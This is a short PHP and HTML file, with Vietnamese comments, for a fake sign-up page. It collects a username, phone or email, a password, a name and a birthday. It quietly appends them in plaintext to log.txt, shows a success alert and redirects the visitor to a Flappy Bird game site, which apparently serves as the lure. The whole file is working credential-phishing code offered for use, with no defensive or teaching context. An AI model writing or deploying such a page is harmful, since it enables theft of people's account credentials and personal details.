<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username =trim($_POST["username"]);
    $password = trim($_POST["password"]);
    $name = trim($_POST["name"]);
    $birthday = trim($_POST["birthday"]);
    // Lay thong tin login vao file log.txt
    // chuyen huong sang trang can launch game
    if(!empty($username)&&!empty($password)&&!empty($name)&&!empty($birthday)){
        $logData = date("Y-m-d H:i:s") . " - Username: $username, Password: $password, Name: $name, Birthday: $birthday\n";
        file_put_contents("log.txt", $logData, FILE_APPEND);
        echo "<script>alert('Sign up successfully');</script>";
        echo "<script>window.location.href='https://flappybird.io'</script>";
        exit();
    } else {
        echo "<script>alert('Fill full in all fields')</script>";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <img src="logo.jpg" alt="Logo" class="logo">
        <form action="login.php" method="POST">
            <input type="text" name="username" placeholder="Username, Phone, or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <input type="name" name="name" placeholder="What che name" required>
            <input type="birthday" name="birthday" placeholder="HPBD" required>
            <button type="submit">Sign Up</button>
        </form>
    </div>
</body>
</html>
